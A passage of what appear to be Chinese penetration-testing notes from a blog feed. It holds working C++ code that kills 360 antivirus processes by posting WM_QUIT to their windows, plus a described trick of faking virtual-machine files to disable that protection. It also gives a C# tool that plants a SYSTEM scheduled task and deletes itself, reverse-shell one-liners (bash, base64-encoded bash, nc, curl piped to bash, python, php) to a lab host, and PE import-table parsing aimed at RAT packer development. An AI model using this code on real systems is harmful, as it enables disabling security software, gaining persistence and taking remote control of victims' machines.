class="language-none">VT-d是一个位于CPU、内存和I/O设备之间的硬件设备，通常位于PCI设备树的根部，或者类似的位于I/O子系统的根部，当VT-d重定向硬件设备启用的时候，它会拦截位于它下面的所有I/O设备产生的中断请求和通过DMA方式对虚拟机内存访问的请求，然后通过查找中断重定向表或者I/O页表的方式（类似分页机制）来重新定位中断转发的目标LAPIC或者是I/O设备访问的目标主机物理内存地址。如下图所示：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655080536022/019f2ad20764425eb9ad7d13cc0aefa5.png" alt="image.png"></p><h2 id="360核晶引擎防护的缺陷（二）"><a href="#360核晶引擎防护的缺陷（二）" class="headerlink" title="360核晶引擎防护的缺陷（二）"></a><del>360核晶引擎防护的缺陷（二）</del></h2><p>一、详细说明</p><p>在核晶防护下的360基本任何RING3下的程序都无法K掉，即使有，也会被拦截。但可通过运行伪造虚拟机白文件暂时关闭360核晶防护，再调用POSTTHREADMESSAGE对360产品每条线程发送WM_QUIT，使其强制关闭。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655080536022/cdaad7b3fbbe4576aba1ef73c3ea3aef.png" alt="image.png"></p><p>注：当然在没有核晶防护的情况下，消息攻击可直接K掉，所以远控木马对于过360防护分级如下：1.过表面 2.过各种拦截 3.过网购 4.过核晶。在免杀论坛，非法贩卖其远控程序的制作者们都以360作为试金石。不同的等级对应不同的价格，从几千至几万不等，猖獗程度远超想象！</p><p>1.1 小试牛刀</p><p>其重点在于如何进行伪造达到欺骗360关闭核晶防护，过程如下：</p><p>360在vmplayer.exe，vmware.exe，VBoxHeadless.exe，VirtualBox.exe等虚拟机文件时，会静默暂时关闭核晶防护，也就是自动适配</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655080536022/bf7de2e5febd42d284a6867170771c22.png" alt="image.png"></p><p>问：我们直接把虚拟机白文件整合到木马的资源里，第一个释放运行不就可以让核晶防护关闭了吗？</p><p>答：当然没那么简单，无论是wvmare.exe还是VBoxHeadless.exe，这些虚拟机白文件 的 “单文件”会运行零点几秒就关闭了，所以我们还得想办法，能让360的核晶防护“持续性”关闭，这样可抽出时间供我们消息攻击使其彻底被KILL掉。</p><p>问：那我们伪造这类文件是否就可欺骗过360呢？</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655080536022/7c678e29f88d424a842266421b1ccce4.png" alt="image.png"></p><h2 id="360核晶引擎防护X64漏洞利用（三）"><a href="#360核晶引擎防护X64漏洞利用（三）" class="headerlink" title="360核晶引擎防护X64漏洞利用（三）"></a>360核晶引擎防护X64漏洞利用（三）</h2><pre class="line-numbers language-none"><code class="language-none">BOOL AllowMeesageForWin7(UINT uMessageID, BOOL bAllow)//注册Win7全局消息 {BOOL bResult = FALSE;HMODULE hUserMod = NULL;hUserMod = LoadLibrary(_T("user32.dll"));if (NULL == hUserMod){return FALSE;}typedef BOOL (WINAPI * _ChangeWindowMessageFilter)(_In_ UINT message,_In_ DWORD dwFlag);_ChangeWindowMessageFilter pChangeWindowMessageFilter;do{_ChangeWindowMessageFilter pChangeWindowMessageFilter = (_ChangeWindowMessageFilter)GetProcAddress(hUserMod, "ChangeWindowMessageFilter");if (NULL == pChangeWindowMessageFilter){AfxMessageBox(_T("create windowmessage filter failed"));break;}bResult = pChangeWindowMessageFilter(uMessageID, bAllow ? 1 : 2);//MSGFLT_ADD: 1, MSGFLT_REMOVE: 2 } while (0);if (NULL != hUserMod){FreeLibrary(hUserMod);}return bResult;}void CByPass2019K360Dlg::OnBnClickedButton1(){// if (!AllowMeesageForWin7(WM_QUIT, TRUE))// {// this-&gt;MessageBoxA("AllowMeesageForWin7 error!", NULL);// }HWND hWnd1 = ::FindWindowA("Q360SafeMonClass", NULL);if (hWnd1 != NULL){//this-&gt;MessageBox("Q360SafeMonClass OK!", NULL);::SetForegroundWindow(hWnd1);::DestroyWindow(hWnd1);::PostMessageA(hWnd1, WM_QUIT, NULL, NULL);}// else// {// this-&gt;MessageBox("Q360SafeMonClass error!", NULL);// }HWND hWnd2 = ::FindWindowA("Q360MobileBaseClass", NULL);if (hWnd2 != NULL){//this-&gt;MessageBox("Qh360TraySafeId OK!", NULL);::SetForegroundWindow(hWnd2);::DestroyWindow(hWnd2);::PostMessageA(hWnd2, WM_QUIT, NULL, NULL);//::SendNotifyMessage(hWnd2, WM_QUIT, NULL, NULL);}// else// {// this-&gt;MessageBox("Qh360TraySafeId error!", NULL);// }HWND hWnd3 = ::FindWindowA("Q360NetmonClass", NULL);if (hWnd3 != NULL){//this-&gt;MessageBox("Q360NetmTrayIconWnd OK!", NULL);::SetForegroundWindow(hWnd3);::DestroyWindow(hWnd3);::PostMessageA(hWnd3, WM_QUIT, NULL, NULL);//::SendNotifyMessage(hWnd3, WM_QUIT, NULL, NULL);}// else// {// this-&gt;MessageBox("Q360NetmTrayIconWnd error!", NULL);// }HWND hWnd4 = ::FindWindowA("Q360SafeMonClass", NULL);if (hWnd4 != NULL){//this-&gt;MessageBox("Q360NetmonMainWndClass OK!", NULL);::SetForegroundWindow(hWnd4);::DestroyWindow(hWnd4);::PostMessageA(hWnd4, WM_QUIT, NULL, NULL);//::SendNotifyMessage(hWnd4, WM_QUIT, NULL, NULL);}else{this-&gt;MessageBox("Q360NetmonMainWndClass error!", NULL);}HWND hWnd5 = ::FindWindowA("Qh360TraySafeId", NULL);if (hWnd5 != NULL){this-&gt;MessageBox("Q360AIClass OK!", NULL);::PostMessageA(hWnd5, WM_QUIT, NULL, NULL);}else{this-&gt;MessageBox("Q360AIClass error!", NULL);}HWND hWnd6 = ::FindWindowA("LiveUpd360C", NULL);if (hWnd6 != NULL){//this-&gt;MessageBox("LiveUpd360C OK!", NULL);::SetForegroundWindow(hWnd6);::DestroyWindow(hWnd6);::PostMessageA(hWnd6, WM_QUIT, NULL, NULL);//::SendNotifyMessage(hWnd6, WM_QUIT, NULL, NULL);}else{this-&gt;MessageBox("LiveUpd360C!", NULL);}HWND hWnd7 = ::FindWindowA("Q360NetmonClass", NULL);if (hWnd7 != NULL){::SetForegroundWindow(hWnd7);::DestroyWindow(hWnd7);::PostMessageA(hWnd7, WM_QUIT, NULL, NULL);//::SendNotifyMessage(hWnd7, WM_QUIT, NULL, NULL);}else{this-&gt;MessageBox("Q360NetmonClass error!", NULL);}HWND hWnd8 = ::FindWindowA("Q360SafeMainClass", NULL);if (hWnd8 != NULL){::SetForegroundWindow(hWnd8);::DestroyWindow(hWnd8);::PostMessageA(hWnd8, WM_QUIT, NULL, NULL);//::SendNotifyMessage(hWnd8, WM_QUIT, NULL, NULL);}else{this-&gt;MessageBox("Q360SafeMainClass error!", NULL);}HWND hWnd9 = ::FindWindowA("tooltips_class32", NULL);if (hWnd9 != NULL){::PostMessageA(hWnd9, WM_QUIT, NULL, NULL);}else{this-&gt;MessageBox("tooltips_class32 error!", NULL);}HWND hWnd10 = ::FindWindowA("Q360MobileBaseClass", NULL);if (hWnd10 != NULL){::SetForegroundWindow(hWnd10);::DestroyWindow(hWnd10);::PostMessageA(hWnd10, WM_QUIT, NULL, NULL);//::SendNotifyMessage(hWnd10, WM_QUIT, NULL, NULL);}else{this-&gt;MessageBox("Q360MobileBaseClass error!", NULL);}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="360核晶引擎防护自建任务方式启动（四）"><a href="#360核晶引擎防护自建任务方式启动（四）" class="headerlink" title="360核晶引擎防护自建任务方式启动（四）"></a>360核晶引擎防护自建任务方式启动（四）</h2><pre class="line-numbers language-none"><code class="language-none">using Microsoft.Win32.TaskScheduler;using System;using System.Diagnostics;using System.IO;namespace TaskSchedulerWrapper{    class Program    {        static void Main(string[] args)        {            logo();            string taskname = null;            string parameter = null;            string path = null;            if (args.Length &gt; 0)            {                foreach (var arg in args)                {                    string userQue = arg.Split('=')[0].Trim();                    string userAns = arg.Split('=')[1].Trim();                    switch (userQue)                    {                        case "--taskname":                            taskname = userAns;                            break;                        case "--arg":                            parameter = userAns;                            break;                        case "--path":                            path = userAns;                            break;                    }                }                if (path != null &amp;&amp; taskname != null)                {                    path = Path.GetFullPath(path);                    if (File.Exists(path) == true)                    {                        if (!GetExists(taskname))                        {                            Console.WriteLine("任务计划不存在，正在添加...");                            CreateTask(path, taskname, parameter);                            Console.WriteLine("添加完毕，正在验证是否存在...");                            if (GetExists(taskname))                            {                                Console.WriteLine("验证成功，退出线程。");                            }                            else                            {                                Console.WriteLine("验证失败，可能被杀毒拦截，退出线程。");                            }                        }                        else                        {                            Console.WriteLine("计划任务已存在，尝试删除计划任务...");                            DeleteTask(taskname);                            if (GetExists(taskname))                            {                                Console.WriteLine("删除失败，退出线程。");                            }                            else                            {                                Console.WriteLine("删除成功，正在添加...");                                CreateTask(path, taskname, parameter);                                Console.WriteLine("添加完毕，正在验证是否存在...");                                if (GetExists(taskname))                                {                                    Console.WriteLine("验证成功，退出线程。");                                }                                else                                {                                    Console.WriteLine("验证失败，可能被杀毒拦截，退出线程。");                                }                            }                        }                        killMe();                    }                    else                    {                        Console.Write("文件不存在或路径不合法，退出线程。");                    }                }                else                {                    Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"Executable File\" --arg=\"Arguments\"(Optional) --taskname=\"TaskScheduler name\"");                    Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"cscript.exe\" --arg=\"/E:Jscript 123.js\" --taskname=\"MS Update\"");                    Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"file.exe\" --taskname=\"MS Update\"");                }            }            else            {                Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"Executable File\" --arg=\"Arguments\"(Optional) --taskname=\"TaskScheduler name\"");                Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"cscript.exe\" --arg=\"/E:Jscript 123.js\" --taskname=\"MS Update\"");                Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"file.exe\" --taskname=\"MS Update\"");            }        }        static bool GetExists(string taskName)        {            var exists = false;            TaskService ts = new TaskService();            TaskCollection tc = ts.RootFolder.GetTasks();            if (tc.Exists(taskName))            {                exists = true;            }            return exists;        }        static void CreateTask(string Path, string taskName, string arg = "")        {            TaskService ts = new TaskService();            TaskDefinition td = ts.NewTask();            td.RegistrationInfo.Author = "WDST";            td.RegistrationInfo.Description = "";            td.Triggers.Add(new LogonTrigger { });            td.Actions.Add(new ExecAction(Path, arg, null));            td.Settings.DisallowStartIfOnBatteries = false;            td.Settings.RunOnlyIfIdle = false;            ts.RootFolder.RegisterTaskDefinition(taskName, td, TaskCreation.CreateOrUpdate, "SYSTEM", null, TaskLogonType.ServiceAccount).Run();        }        static void DeleteTask(string taskName)        {            TaskService ts = new TaskService();            ts.RootFolder.DeleteTask(taskName);        }        static void killMe()        {            string s = Process.GetCurrentProcess().MainModule.FileName;            Process CmdProcess = new Process();            CmdProcess.StartInfo.FileName = "cmd.exe";            CmdProcess.StartInfo.CreateNoWindow = true;            CmdProcess.StartInfo.UseShellExecute = false;            CmdProcess.StartInfo.RedirectStandardInput = true;            CmdProcess.StartInfo.RedirectStandardOutput = true;            CmdProcess.StartInfo.RedirectStandardError = true;            CmdProcess.StartInfo.Arguments = "/c ping -n 1 localhost 1&gt;nul &amp; del " + "\"" + s + "\"";            CmdProcess.Start();            CmdProcess.Close();            Process.GetCurrentProcess().Kill();        }        static void logo()        {            Console.WriteLine(@"  _____        _    ___     _           _      _         ");            Console.WriteLine(@" |_   _|_ _ __| |__/ __| __| |_  ___ __| |_  _| |___ _ _ ");            Console.WriteLine(@"   | |/ _` (_-&lt; / /\__ \/ _| ' \/ -_) _` | || | / -_) '_|");            Console.WriteLine(@"   |_|\__,_/__/_\_\|___/\__|_||_\___\__,_|\_,_|_\___|_|  ");            Console.WriteLine();        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.25-da-zao-zi-ji-du-li-de-hong-lan-dui-kang-rat-hou-men-shell-san/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.25-da-zao-zi-ji-du-li-de-hong-lan-dui-kang-rat-hou-men-shell-san/</url>
      
        <content type="html"><![CDATA[<h2 id="各种反弹shell的方法总结与技巧（一）"><a href="#各种反弹shell的方法总结与技巧（一）" class="headerlink" title="各种反弹shell的方法总结与技巧（一）"></a>各种反弹shell的方法总结与技巧（一）</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h4><p><strong>什么是反弹shell（reverse shell）？</strong></p><p>就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p><p><strong>为什么需要反弹shell？</strong></p><p>反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。以下详细介绍Windows和Linux系统下反弹shell的几种方式。</p><h4 id="一、linux下反弹shell"><a href="#一、linux下反弹shell" class="headerlink" title="一、linux下反弹shell"></a><strong>一、linux下反弹shell</strong></h4><p>实验环境：</p><p>Win10 192.168.2.102 NC监听</p><p>Kali 192.168.2.103 自带工具</p><p><strong>bash反弹</strong></p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/192.168.2.102/7777 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654650208004/dc4a6385d2df499fa0d2ccd3868e17ef.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTAyLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654650208004/40fc7e611dff478e93a43f8d8f009a7e.png" alt="image.png"></p><h4 id="2-nc反弹"><a href="#2-nc反弹" class="headerlink" title="2.nc反弹"></a><strong>2.nc反弹</strong></h4><pre class="line-numbers language-none"><code class="language-none">nc -e /bin/bash 192.168.2.102 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654650208004/0b743caee9fc432397037727e583e9a9.png" alt="image.png"></p><h4 id="3-curl反弹"><a href="#3-curl反弹" class="headerlink" title="3.curl反弹"></a><strong>3.curl反弹</strong></h4><p>Kali开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可。</p><pre class="line-numbers language-none"><code class="language-none">curl 192.168.2.103/bash.html|bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654650208004/07ef211486a94ab18af6fdec07e5cbe7.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654650208004/17b14138a54e43e88a7692755f92e998.png" alt="image.png"></p><h2 id="各种反弹shell的方法总结与技巧（二）"><a href="#各种反弹shell的方法总结与技巧（二）" class="headerlink" title="各种反弹shell的方法总结与技巧（二）"></a>各种反弹shell的方法总结与技巧（二）</h2><h4 id="1-whois反弹"><a href="#1-whois反弹" class="headerlink" title="1.whois反弹"></a><strong>1.whois反弹</strong></h4><p>whois -h 192.168.2.102 -p 4444 <code>pwd</code> //反弹的shell只能执行后面带的命令</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654650208004/b8217cc1a2904d59bc98f64c3a880d09.png" alt="image.png"></p><h4 id="2-python反弹"><a href="#2-python反弹" class="headerlink" title="2.python反弹"></a><strong>2.python反弹</strong></h4><pre class="line-numbers language-none"><code class="language-none">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654650208004/fab0f87a3dce437399136d610c5b2fe2.png" alt="image.png"></p><h4 id="3-PHP反弹"><a href="#3-PHP反弹" class="headerlink" title="3.PHP反弹"></a><strong>3.PHP反弹</strong></h4><p>php反弹shell和python的方式差不多</p><pre class="line-numbers language-none"><code class="language-none">php -r '$sock=fsockopen("192.168.2.102",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654650208004/94a8534c99344ee79db93855d98aa870.png" alt="image.png"></p><h2 id="内网渗透反弹shell的原理（三）"><a href="#内网渗透反弹shell的原理（三）" class="headerlink" title="内网渗透反弹shell的原理（三）"></a>内网渗透反弹shell的原理（三）</h2><h4 id="正向反弹shell："><a href="#正向反弹shell：" class="headerlink" title="正向反弹shell："></a>正向反弹shell：</h4><h4 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h4><p>利用nc正向连接目标服务器的shell，获得目标服务器的控制权限(dmz大型靶场)</p><h5 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h5><p>攻击者可以访问（连接）web服务器的目标（开放）端口，web服务器防火墙未拦截攻击者的入站流量。适用于，能够访问到被控机器的开放端口。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1654650208004/5e63586ce4434e6581f6355b0330091d.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.18-gai-ke-mian-sha-gao-ji-ji-qiao-san/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.18-gai-ke-mian-sha-gao-ji-ji-qiao-san/</url>
      
        <content type="html"><![CDATA[<h2 id="RAT红队壳开发导入表解析与IAT-Hook技术（一）"><a href="#RAT红队壳开发导入表解析与IAT-Hook技术（一）" class="headerlink" title="RAT红队壳开发导入表解析与IAT Hook技术（一）"></a>RAT红队壳开发导入表解析与IAT Hook技术（一）</h2><h5 id="RVA，FOA与VA"><a href="#RVA，FOA与VA" class="headerlink" title="RVA，FOA与VA"></a>RVA，FOA与VA</h5><p>在对PE文件进行解析的过程中，经常需要对这三类地址进行转换。</p><ul><li><strong>RVA</strong> ：相对虚拟内存地址，指的是文件加载到内存中以后相对于起始地址的偏移。</li><li><strong>FOA</strong> ：文件偏移地址，指的是文件保存在磁盘中时候，相对于起始地址的偏移。</li><li><strong>VA</strong> ：虚拟内存地址，文件在内存中的真实地址。</li></ul><p>依然是昨天的这张图，可以看到，由于FileAlignment和SectionAlignment的不同，节区中的地址相对于起始地址偏移是不同的。以地址0x401为例，这个地址是在第一个节区中，由于在文件中由于FileAlignment是0x400，所以这个地址在文件中就是0x401。而在内存中，由于SectionAlignment是0x1000，所以前面PE头的数据会被填充到0x1000，所以这个地址就是0x1001。</p><p>据此也可以知道RVA和FOA的转换关系，如果地址是在PE头中，那么FOA==RVA。而如果地址是在节区中，就需要判断文件是在哪一个节区，然后根据这个地址和节区的偏移来算出它在文件中的位置FOA。</p><p>比如，如果RVA是0x1001，那么在内存中，它就是在第一个节区，它和第一个节区的偏移就是0x1。那么FOA就等于文件中第一个节区的位置加上这个偏移，也就是0x400+1=0x401。在PE的结构中，只要是VirtualAdresss字段名的数据，都是RVA，实际操作的时候都需要转换成FOA。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1653138348044/83b93395d9414bafb6995d5bf434180b.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">DWORD PEParse::RVAToFOA(DWORD dwRVA){    DWORD dwFOA = dwRVA;    WORD wSectionNum = this-&gt;pFileHead-&gt;NumberOfSections, i = 0;     for (i = 0; i &lt; wSectionNum; i++)    {        if (this-&gt;pSectionHead[i].VirtualAddress &lt;= dwRVA &amp;&amp;             dwRVA &lt;= this-&gt;pSectionHead[i].VirtualAddress + this-&gt;pSectionHead[i].Misc.VirtualSize)    //判断在哪个节区中        {            dwFOA = this-&gt;pSectionHead[i].PointerToRawData + dwRVA - this-&gt;pSectionHead[i].VirtualAddress;  //根据节区的偏移算出FOA            break;        }    }     return dwFOA;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RAT红队壳开发导入表作用（二）"><a href="#RAT红队壳开发导入表作用（二）" class="headerlink" title="RAT红队壳开发导入表作用（二）"></a>RAT红队壳开发导入表作用（二）</h2><p>在Windows系统中，可以用两种方式加载DLL。分别称为隐式链接和显示链接，其区别就是隐私链接进来的DLL会随着程序的启动而为函数分配相应的内存，而显示链接则是在程序需要调用相关函数的时候获取相应的地址。但是随着系统版本的不同，加载的DLL数量顺序等等的不同，DLL中的函数地址是不确定的。</p><p>为了可以让程序每次都能找到正确的地址，就需要程序用一块地址来专门记录这些隐式链接的DLL中的函数地址，这块专门的地址就是叫导入表。每次启动的时候，操作系统都会获取正确的函数地址填入到导入表中。</p><p>比如下面这张图是对MessageBox的调用，可以看到程序不是E8的直接调用，而是E9的间接调用，所调用的是地址0x0042A2AC地址中保存的数据。而0x0042A2AC这个地址其实就是IAT表，后面会详细说这个表。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1653138348044/22ddeb150ad6484aa432a6ed52ca7250.png" alt="image.png"></p><p>在内存窗口中查看这个地址中的内容，可以看到调试器已经告诉了我们这是一个MessageBox的函数地址。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1653138348044/ea371699e1a44aa3b8e2b36e08629794.png" alt="image.png"></p><p>要获取导入表的地址，首先就需要到可选头的最后一个成员，也就是IMAGE_DATA_DIRECTORY数组DataDirectory中去找。数组中的第一项保存的就是导入表的信息，在文件中有如下的定义</p><pre class="line-numbers language-none"><code class="language-none">#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而IMAGE_DATA_DIRECTORY的定义如下</p><pre class="line-numbers language-none"><code class="language-none">typedef struct _IMAGE_DATA_DIRECTORY {    DWORD   VirtualAddress;    DWORD   Size;} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中的VirtualAddress就是导入表在内存中的RVA，要在文件中找到就需要转换成相应的FOA。获取到的地址就是导入表的起始地址，所指的就是第一个导入表的地址，保存的是IMAGE_IMPORT_DESCRIPTOR结构体，结构体定义如下</p><pre class="line-numbers language-none"><code class="language-none">typedef struct _IMAGE_IMPORT_DESCRIPTOR {    union {        DWORD   Characteristics;            // 0 for terminating null import descriptor        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)    } DUMMYUNIONNAME;    DWORD   TimeDateStamp;                  // 0 if not bound,                                            // -1 if bound, and real date\time stamp                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)                                            // O.W. date/time stamp of DLL bound to (Old BIND)     DWORD   ForwarderChain;                 // -1 if no forwarders    DWORD   Name;    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)} IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于程序会需要多个导入表，而每个导入表都有这样的一个结构，它们在内存中顺序存储下去形成数组。所以，为了说明已经加载了全部的导入表，系统会在最后一个导入表后面加入一块IMAGE_IMPORT_DESCRIPTOR结构体大小的0来说明已经结束。</p><p>结构中的Name指向的是地址保存了导入的Dll文件的文件名，而OriginalFirstThunk和FirstThunk保存的地址分别是INT和IAT表的地址，这3个地址都是RVA，使用的时候都要转成FOA。</p><p>INT和IAT所指地址的内容是一块数组，数组中的每个元素都是IMAGE_THUNK_DATA32结构体的定义如下</p><pre class="line-numbers language-none"><code class="language-none">typedef struct _IMAGE_THUNK_DATA32 {    union {        DWORD ForwarderString;      // PBYTE         DWORD Function;             // PDWORD        DWORD Ordinal;        DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME    } u1;} IMAGE_THUNK_DATA32;typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结构体中，是一个联合体，而联合体中的每个成员都是4字节的内容，所以我们可以认为INT表和IAT表所指向的是一个整型数组。数组中保存的值的最高位是1的时候，去除最高位，得到的就是函数的导出序号，否则就是一个指向IMAGE_IMPORT_BY_NAME的RVA，结构体定义如下</p><pre class="line-numbers language-none"><code class="language-none">typedef struct _IMAGE_IMPORT_BY_NAME {    WORD    Hint;    BYTE    Name[1];} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中的Name保存的就是导入的函数的名称，该名称是以0作为结束符。</p><p>对于判断最高位是否位1，在文档中有如下的定义</p><pre class="line-numbers language-none"><code class="language-none">#define IMAGE_ORDINAL_FLAG64 0x8000000000000000#define IMAGE_ORDINAL_FLAG32 0x80000000                //32位下，最高位位1#define IMAGE_ORDINAL64(Ordinal) (Ordinal &amp; 0xffff)#define IMAGE_ORDINAL32(Ordinal) (Ordinal &amp; 0xffff)#define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal &amp; IMAGE_ORDINAL_FLAG64) != 0)#define 